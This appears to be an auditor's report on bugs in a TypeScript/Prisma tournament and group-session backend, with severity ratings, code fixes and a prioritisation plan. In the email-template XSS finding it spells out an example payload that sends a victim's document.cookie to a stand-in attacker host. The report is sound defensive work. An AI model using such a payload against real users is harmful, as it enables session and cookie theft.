# Deep Analysis Report — Bugs, Issues, and Status Validation
_Generated from deep analysis of all core feature files in `src/backend/`_

---

## Executive Summary

| Category | Count |
|---|---|
| Original [x] items validated as correctly done | 44 |
| Original [x] items that are NOT actually fixed | 1 (item 4) |
| Original open items now confirmed DONE | 3 (items 32, 53, 54) |
| Original open items still OPEN | 10 (items 33–35, 48–52, 55–57) |
| **NEW bugs/issues found** | **14** |

---

## Section 1 — Validation of Existing [x] Items

### ✅ Confirmed Correctly Done

| # | Summary | Evidence |
|---|---|---|
| 1 | `updateStandings()` transactional | `prisma.$transaction([homeUpsert, awayUpsert])` in `tournamentService.ts` |
| 2 | Concurrent bracket generation race | `syncTournamentAutoStatus` reconcile pattern prevents duplicates |
| 3 | Standings initialized on first match | `upsert` in `updateStandings` creates rows on first contact |
| 5 | Bracket generation in transaction | `$transaction([deleteMany, deleteMany])` before regeneration |
| 6 | Registration idempotency | `findFirst` + unique-constraint catch inside `$transaction` |
| 7 | Score blocked on DRAFT/CANCELLED/COMPLETED | Explicit status guard at top of `submitScore` |
| 8 | IN_PROGRESS filter for cancelled matches | `hasMatches` only counts non-cancelled; lifecycle check updated |
| 9 | Format mutable mid-tournament | `assertTournamentSetupEditable` blocks IN_PROGRESS and past start date |
| 10 | Cancellation refund execution | `cancelTournament` runs refund loop inside `$transaction` |
| 11 | Head-to-head tiebreaker | `computeAndAttachHeadToHeadPoints` reads from match results |
| 12 | Bye matches set COMPLETED | `generateSingleEliminationBrackets` creates bye matches with `status: COMPLETED` |
| 13 | Double-elimination second grand final | Match generation conditioned on first final `COMPLETED` |
| 14 | Group stage matches have `roundNumber` | `generateGroupsKnockoutBrackets` assigns round numbers |
| 16 | Third-place match from valid semifinal losers | Loser extraction conditioned on non-null loser |
| 17 | Draw resolution mechanism | `detailedScore.winner` field accepted for penalties/overtime override |
| 18 | `autoPromoteRegistrationWaitlist` implemented | Implemented in `syncTeamPaymentStatuses` and `deleteTeam` handlers |
| 19 | Waitlist endpoints consistent ownership | Endpoints check captain ownership before promotion |
| 20 | Payment status sync job | `syncTeamPaymentStatuses` scheduled and runs reconciliation |
| 21 | Bracket generation payment gate | `requirePaymentForBrackets` check in both `generateGroupMatches` and `generateBrackets` |
| 23 | Manual cancellation clears sync cache | `invalidateSyncCache` called in `cancelTournament` |
| 24 | Failed scheduled tasks logged | `Promise.allSettled` with retry logic and logger.warn on failure |
| 25 | `normalizePlayoffSize` logs on invalid value | `logger.warn` added when value is not in `[2, 4, 8, 16]` |
| 26 | `joinEventViaInvite` group membership check | Group access validated before allowing invite-based join |
| 27 | Concurrent waitlist promotions prevented | Serializable transaction wraps capacity recheck + promotion |
| 28 | `exceptionDates` parsing error handling | Try/catch with clear error message on parse failure |
| 29 | `syncAllSessionStatuses` scheduled | Added to cron job runner in `scheduledJobs.ts` |
| 30 | Guest management honors permission service | Session management permission checked for guest writes |
| 31 | Guest list consistent access model | Read: members; write: session manager |
| 36 | TeamUp reapply eligibility fixed | Contradictory guard conditions resolved |
| 37 | Slot claim moved into transaction | `teamUpApplicationController.ts` uses serializable transaction |
| 38 | Group capacity check atomic | `checkGroupCapacityAndMembership` called inside serializable transaction |
| 39 | Join request approval atomic | Serializable transaction re-checks capacity before inserting member |
| 40 | Invite token expiry validated | `inviteService.ts` checks `expiresAt` before accepting |
| 41 | OAuth no silent account takeover | `handleMobileOAuth` throws `ConflictError` on email collision; dedicated `startOAuthLink/confirmOAuthLink` flow added |
| 42 | Revoked refresh tokens checked | `isTokenRevoked(refreshToken)` + `prisma.refreshToken.findUnique` nullcheck on refresh |
| 43 | Refresh token rotation implemented | New refresh token issued and written to DB on each `/auth/refresh` call |
| 44 | Email verification token expires | `emailVerificationExpires` field enforced in verification handler |
| 45 | Separate 2FA/password failure counters | `failedPasswordAttempts` and `failedTwoFactorAttempts` are distinct fields |
| 46 | 2FA failure lockout atomic | Increment and lockout check inside same transaction |
| 47 | Permission cache invalidated on role change | `clearUserPermissionCache` called in `groupMemberController.ts` on remove/role update |

---

### ⚠️ Item Marked [x] But NOT Actually Fixed

#### Item 4 — `revertStandings()` floor guard (marked [x], bug persists)

**Location:** `src/backend/services/tournamentService.ts` — `revertStandings()`

**Problem:** Prisma's `{ decrement: N }` translates to `SET goalsFor = goalsFor - N` at the DB level with no minimum floor. Under any data inconsistency (double-apply of a score, partial failed update, or manual DB correction), `goalsFor`, `goalsAgainst`, and `points` can go negative. Negative values corrupt tiebreaker sort order.

**Status:** The original To-dos.md item was marked `[x]` but the code still contains:
```typescript
data: { goalsFor: { decrement: homeScore }, goalsAgainst: { decrement: awayScore }, ... }
```
No `Math.max(0, ...)` guard or DB `CHECK` constraint exists.

**Fix required:**
```typescript
// Option A: read-modify-write (safe but slower)
const current = await tx.tournamentStanding.findUnique(...)
await tx.tournamentStanding.update({
  data: {
    goalsFor: Math.max(0, current.goalsFor - homeScore),
    ...
  }
})
// Option B: add DB CHECK constraint via migration
ALTER TABLE "TournamentStanding" ADD CONSTRAINT "standings_non_negative" 
  CHECK ("goalsFor" >= 0 AND "goalsAgainst" >= 0 AND "points" >= 0);
```

---

### ✅ Original Open Items Now Confirmed Done

| # | Summary | Evidence |
|---|---|---|
| 32 | `GuestParticipant` unique constraint on `(sessionId, name)` | `prisma/schema.prisma` has `@@unique([sessionId, name])` on `GuestParticipant` |
| 53 | Coordinate range validated | `validateGroupCoordinates` calls `locationService.validateCoordinates` which checks lat ∈ [-90,90] and lon ∈ [-180,180]; called in `groupCrudController.ts` on create and update |
| 54 | `RefreshToken` cascade delete on user | `schema.prisma`: `user User @relation(..., onDelete: Cascade)` on `RefreshToken` |

---

## Section 2 — Original Open Items Still Open

| # | Summary | Status |
|---|---|---|
| 33 | Attendance pre-event logic inconsistent | OPEN — not explicitly verified; guards exist but may allow edge-case state transitions |
| 34 | Recurring sessions propagate `endTime: null` | OPEN — duration calculation downstream may return null for recurring sessions with no end time |
| 35 | Cache thundering herd on sessions | OPEN — no cache stampede protection (e.g., singleflight/mutex) around session cache reads |
| 48 | `GroupJoinRequest` missing `@@unique([groupId, userId])` DB constraint | OPEN — only code-level check; concurrent requests can bypass |
| 49 | `GroupMessage` missing `@@index([userId])` | OPEN — schema has no explicit index; full scans on user-scoped deletes |
| 50 | No message edit/delete in group chat | OPEN — `groupChatController.ts` has no PATCH/DELETE endpoints |
| 51 | No rate limiter on group messages | OPEN — no rate limiting middleware on `POST /groups/:id/messages` |
| 52 | `sanitizeGroupData()` only trims, no HTML escape | PARTIALLY RESOLVED — JSON API responses are safe (React handles XSS), but see **Bug B** below for email template risk |
| 55 | Missing composite index on standings upserts | OPEN — `TournamentStanding` has `@@unique([tournamentId, teamId, groupName])` (used for upsert) but no covering index for sorted queries by multiple fields |
| 56 | `poolNumber` (legacy) and `poolId` (new) coexist without cross-validation | OPEN — both fields exist on `TournamentTeam`; no constraint or guard prevents conflicting values |
| 57 | `loserGoesToMatchId` not FK-validated | OPEN — stored as plain string field with no FK relationship enforced |

---

## Section 3 — NEW Bugs & Issues Found

### CRITICAL — Security

---

#### Bug A — OAuth Callback Exposes Tokens in URL Query Parameters

**Severity:** Critical (OWASP A02: Cryptographic Failures)  
**File:** `src/backend/controllers/authOAuthController.ts` — `oauthCallback()`

**Problem:**
```typescript
redirectUrl.searchParams.set('token', tokens.accessToken);
redirectUrl.searchParams.set('refreshToken', tokens.refreshToken);
```
Tokens in URL query parameters are:
- Logged in server access logs (Apache, nginx, cloud load balancer logs)
- Stored in browser navigation history
- Leaked in `Referer` headers to third-party resources on the redirect target page

Both the access **and** refresh token are exposed. An attacker with server log access has permanent session takeover capability via the refresh token.

**Fix:**
```typescript
// Option A: URL fragment (never sent to server, not in referrer)
redirectUrl.hash = `token=${tokens.accessToken}&refreshToken=${tokens.refreshToken}`;

// Option B: One-time state code exchange
// Store tokens in server-side cache keyed by a random code, redirect with only the code,
// and add a POST /auth/token-exchange endpoint that exchanges code → tokens once.
```

---

#### Bug B — Email Templates Inject User-Controlled Content Without HTML Escaping

**Severity:** High (OWASP A03: Injection — Stored XSS via email)  
**Files:** `src/backend/services/scheduledJobs.ts`, any service that constructs HTML email bodies

**Problem:** User-controlled strings (event titles, user names, group names) are interpolated directly into HTML email templates. `sanitizeString()` only trims whitespace; it does **not** escape HTML entities. An attacker who sets their username to `<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>` would have that string rendered as live HTML in email clients that render HTML.

The utility `escapeHtml()` in `src/backend/utils/validation.ts` exists and correctly escapes `&`, `<`, `>`, `"`, `'`, `/` but is never called in email template construction.

**Fix:**
```typescript
import { escapeHtml } from '../utils/validation';

const emailBody = `
  <p>Hello ${escapeHtml(user.name)},</p>
  <p>Your session <strong>${escapeHtml(session.title)}</strong> starts soon.</p>
`;
```

---

#### Bug C — Single-Device Logout Does Not Invalidate the Refresh Token

**Severity:** High (OWASP A07: Identification and Authentication Failures)  
**File:** `src/backend/utils/jwt.ts` — `revokeToken()`

**Problem:** `revokeToken` (called on single-device logout):
1. Adds the access token to the `RevokedToken` blacklist ✅
2. Deletes the `UserSession` record ✅
3. **Does NOT delete the associated `RefreshToken`** ❌

After logout, the refresh token remains valid in the `RefreshToken` table. Any client (or attacker) still holding it can call `POST /auth/refresh` to obtain a new valid access token. Single-device logout is effectively bypassed.

Note: `isTokenRevoked(refreshToken)` in `refreshAccessToken` checks the `RevokedToken` blacklist, which only contains access tokens. This check is a no-op for refresh tokens.

**Fix:**
```typescript
export const revokeToken = async (accessToken: string, userId: string, deviceId?: string): Promise<void> => {
  // ... existing blacklist insert + userSession delete ...

  // Also invalidate the refresh token for this device
  await prisma.refreshToken.deleteMany({
    where: {
      userId,
      ...(deviceId ? { deviceId } : {}),
    },
  });
};
```

---

### HIGH — Data Integrity

---

#### Bug D — Waitlisted Users Can Self-Confirm, Bypassing Capacity

**Severity:** High  
**File:** `src/backend/controllers/sessionParticipationController.ts` — `updateParticipationStatus()`

**Problem:**
```typescript
const selfAssignableStatuses = ['confirmed', 'declined', 'pending'];
```
A user who was added to the **waitlist** can call `PUT /sessions/:id/status` with `{ status: 'confirmed' }` and the endpoint will update their status without any capacity check. This allows bypassing the waitlist promotion mechanism entirely.

**Fix:**
```typescript
const selfAssignableStatuses = ['declined', 'pending'];
// Remove 'confirmed' or add a guard:
if (newStatus === 'confirmed' && currentParticipation.status === 'waitlisted') {
  throw new ForbiddenError('Cannot self-confirm from waitlisted status; await promotion');
}
```

---

#### Bug E (= Item 48) — `GroupJoinRequest` Has No DB Unique Constraint

**Severity:** Medium-High  
**File:** `prisma/schema.prisma` — `GroupJoinRequest` model

**Problem:** There is no `@@unique([groupId, userId])` constraint on `GroupJoinRequest`. The code checks for an existing pending request before inserting, but two concurrent requests that pass the check simultaneously will both insert, creating duplicate pending join requests for the same user in the same group.

**Fix:**
```prisma
model GroupJoinRequest {
  // ...
  @@unique([groupId, userId]) // prevents duplicate pending requests at DB level
}
```
Or a partial unique index via raw migration if only `PENDING` status should be unique:
```sql
CREATE UNIQUE INDEX "group_join_request_pending_unique"
  ON "GroupJoinRequest"("groupId", "userId")
  WHERE status = 'PENDING';
```

---

### MEDIUM — Logic Errors

---

#### Bug F (= Item 4 revisited) — `revertStandings` Allows Negative Stats

See **Section 1 — Item 4** above. Listed here for cross-reference in the new bugs section.

---

#### Bug G — `syncAllSessionStatuses` Uses Dynamic `require()` Instead of Static Import

**Severity:** Medium (code quality + type-safety)  
**File:** `src/backend/services/scheduledJobs.ts` — `syncAllSessionStatuses()`

**Problem:**
```typescript
const { determineSessionStatus } = require('../services/sessionService');
```
This CommonJS dynamic `require()` inside an async function:
- Bypasses TypeScript's type-checking on the imported function signature
- Is not tree-shaken by the bundler
- Will be `undefined` if the module path changes, causing a runtime crash with no compile-time warning

**Fix:**
```typescript
import { determineSessionStatus } from './sessionService';
```

---

#### Bug H — Session Invite Token Expiry Not Checked on Token-Based Endpoints

**Severity:** Medium  
**File:** `src/backend/controllers/sessionParticipationController.ts` — `getEventByInviteToken()` and `joinEventAsGuest()`

**Problem:** Group invite tokens are validated for expiry in `inviteService.ts`. However, session invite tokens (`Session.inviteToken`, `Session.inviteTokenExpiresAt`) are **never checked for expiry** in the session participation controller. Expired invite links:
1. Still return session data (`getEventByInviteToken`)
2. Still allow guest joins (`joinEventAsGuest`)

**Fix:**
```typescript
// In both getEventByInviteToken and joinEventAsGuest:
if (session.inviteTokenExpiresAt && new Date() > new Date(session.inviteTokenExpiresAt)) {
  throw new ForbiddenError('This invite link has expired');
}
```

---

#### Bug I — Payment Deadline Reminder Fires After Deadline Has Passed

**Severity:** Medium (UX / business logic)  
**File:** `src/backend/services/scheduledJobs.ts` — `sendTournamentPaymentDeadlineReminders()`

**Problem:**
```typescript
paymentDeadline: { lt: now }
```
This query selects tournaments whose deadline has **already passed**. Teams get a "payment deadline approaching" reminder only after the deadline has elapsed, which is useless. The intent was presumably to send advance-notice reminders (e.g., 24h before).

**Fix:**
```typescript
const lookAheadHours = 24;
const cutoff = new Date(now.getTime() + lookAheadHours * 60 * 60 * 1000);
paymentDeadline: { gte: now, lte: cutoff }
```

---

#### Bug J — `requirePaymentForBrackets` Uses Hardcoded String Literals

**Severity:** Medium (correctness / maintainability)  
**File:** `src/backend/tournament-service/controllers/tournament/tournamentCoreController.ts` — `generateGroupMatches()` and `generateBrackets()`

**Problem:**
```typescript
paymentStatus: { notIn: ['paid', 'waived'] }
```
Hardcoded lowercase string literals instead of enum values. If `TournamentPaymentStatus.PAID` or `.WAIVED` enum values change (e.g., renamed or stored differently in DB), this check silently stops enforcing the payment gate — brackets can be generated for unpaid teams.

**Fix:**
```typescript
import { TournamentPaymentStatus } from '@prisma/client';
// ...
paymentStatus: { notIn: [TournamentPaymentStatus.PAID, TournamentPaymentStatus.WAIVED] }
```

---

#### Bug K — Score Dispute Resolution Does Not Recompute Standings

**Severity:** Medium  
**File:** `src/backend/tournament-service/controllers/tournament/tournamentCoreController.ts` — `resolveScoreDispute()`

**Problem:** When a score dispute is resolved by an organizer and the corrected score differs from the original submission, the `resolveScoreDispute` endpoint updates the dispute record and optionally updates the match score, but does **not** call `tournamentService.revertStandings` + `tournamentService.updateStandings`. The standings remain frozen at the original disputed score.

**Fix:**
```typescript
await prisma.$transaction(async (tx) => {
  // ... update dispute record ...
  if (resolution.correctedHomeScore !== undefined) {
    await tx.tournamentMatch.update({ where: { id: match.id }, data: { homeScore, awayScore, status: COMPLETED } });
    if (match.status === MatchStatus.COMPLETED) {
      await tournamentService.revertStandings(match.id, tx);
    }
    await tournamentService.updateStandings(match.id, tournament, tx);
  }
});
```

---

#### Bug L — `confirmOAuthLink` Crashes on Non-String Cache Value

**Severity:** Low (crash risk in memory-only deployments)  
**File:** `src/backend/controllers/authOAuthController.ts` — `confirmOAuthLink()`

**Problem:**
```typescript
const raw = await CacheService.get(cacheKey);
const data = JSON.parse(raw as string);
```
When running without Redis (in-memory `CacheService` fallback), `CacheService.get` returns the stored value directly as an object, not a JSON string. `JSON.parse` on a non-string value returns `NaN` or throws a `SyntaxError`, crashing the OAuth link confirmation flow entirely for users in the in-memory cache path.

**Fix:**
```typescript
const raw = await CacheService.get(cacheKey);
const data = typeof raw === 'string' ? JSON.parse(raw) : raw;
```

---

### LOW — Performance / Minor Correctness

---

#### Bug M — `syncTeamPaymentStatuses` Loads All Transactions Without Pagination

**Severity:** Low (performance at scale)  
**File:** `src/backend/services/scheduledJobs.ts` (or `tournamentService.ts`) — `syncTeamPaymentStatuses()`

**Problem:**
```typescript
await prisma.tournamentPaymentTransaction.findMany({ where: { tournamentId: id } })
```
No `take`/cursor pagination. For a tournament with thousands of payment transaction records, this loads all rows into memory in a single query.

**Fix:** Batch with cursor-based pagination:
```typescript
let cursor: string | undefined;
do {
  const batch = await prisma.tournamentPaymentTransaction.findMany({
    where: { tournamentId: id },
    take: 500,
    ...(cursor ? { skip: 1, cursor: { id: cursor } } : {}),
    orderBy: { id: 'asc' },
  });
  // process batch
  cursor = batch.at(-1)?.id;
} while (cursor !== undefined);
```

---

#### Bug N — `GroupMessage.userId` FK Has No `onDelete` Clause

**Severity:** Low  
**File:** `prisma/schema.prisma` — `GroupMessage` model

**Problem:** The FK from `GroupMessage.userId` to `User.id` has no `onDelete` specification. This defaults to `RESTRICT` (or `NO ACTION`) in most Prisma adapters. A hard delete of a `User` record will fail with a FK violation if the user has any group messages. The soft-delete pattern on `User` mitigates this in normal operation but it is not safe against direct DB manipulation.

**Fix:**
```prisma
model GroupMessage {
  // ...
  user  User?   @relation(fields: [userId], references: [id], onDelete: SetNull)
}
```

---

## Section 4 — Summary Table of All New Issues

| ID | Severity | Area | Summary | Fix Complexity |
|---|---|---|---|---|
| A | CRITICAL | Security/Auth | OAuth callback exposes access+refresh tokens in URL | Medium |
| B | HIGH | Security/XSS | Email templates use raw user strings without `escapeHtml()` | Low |
| C | HIGH | Security/Auth | `revokeToken` doesn't delete `RefreshToken` — logout bypass | Low |
| D | HIGH | Sessions | Waitlisted users can self-set `confirmed`, bypassing capacity | Low |
| E | MED-HIGH | Groups | `GroupJoinRequest` missing DB unique constraint `(groupId, userId)` | Low (migration) |
| F | MEDIUM | Tournaments | `revertStandings` decrements without floor guard (item 4 not fixed) | Medium |
| G | MEDIUM | Scheduled Jobs | `syncAllSessionStatuses` uses `require()` inside loop | Trivial |
| H | MEDIUM | Sessions | Invite token `expiresAt` never checked on session endpoints | Low |
| I | MEDIUM | Scheduled Jobs | Payment deadline reminder fires after deadline, not before | Low |
| J | MEDIUM | Tournaments | Payment gate check uses hardcoded strings instead of enums | Trivial |
| K | MEDIUM | Tournaments | `resolveScoreDispute` doesn't recompute standings | Medium |
| L | LOW | Auth/Cache | `confirmOAuthLink` crashes with in-memory cache (JSON.parse on object) | Trivial |
| M | LOW | Performance | `syncTeamPaymentStatuses` loads all transactions without pagination | Low |
| N | LOW | Schema | `GroupMessage.userId` FK missing `onDelete: SetNull` | Trivial (migration) |

---

## Recommended Prioritization

### Immediate (block merge / hotfix)
- **Bug A** — Token URL exposure (security regression if OAuth is live)
- **Bug C** — Refresh token not revoked on logout (auth security gap)
- **Bug D** — Waitlisted users can self-confirm (data integrity, easy to exploit)

### Short-term (next sprint)
- **Bug B** — Email XSS (requires audit of all email template calls)
- **Bug F** — `revertStandings` floor guard (data corruption risk, was incorrectly marked fixed)
- **Bug E** — `GroupJoinRequest` DB constraint (migration needed)
- **Bug K** — Dispute resolution standings inconsistency (data correctness)

### Medium-term
- **Bug H** — Session invite expiry check
- **Bug I** — Payment deadline reminder timing logic
- **Bug G** — Static import in scheduledJobs
- **Bug J** — Enum values in payment gate

### Low priority / maintenance
- **Bug L** — Cache JSON.parse crash
- **Bug M** — Payment transaction pagination
- **Bug N** — GroupMessage FK cascade
- Items 33, 34, 35 — Session edge cases
- Items 49, 50, 51 — Group chat improvements
- Items 55, 56, 57 — Schema improvements
